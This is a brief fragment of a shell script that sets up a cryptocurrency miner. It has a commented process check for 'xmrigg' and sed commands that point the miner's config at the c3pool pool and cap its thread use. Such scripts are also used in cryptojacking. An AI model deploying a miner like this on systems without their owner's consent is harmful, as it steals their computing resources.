...
#pgrep -x xmrigg >/dev/null && echo "Process found" && exit 1 || echo "Process not found"
...
sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:443",/' $HOME/c3pool/config.json
...
sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 50,/' $HOME/c3pool/config.json
sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 50,/' $HOME/c3pool/config_background.json
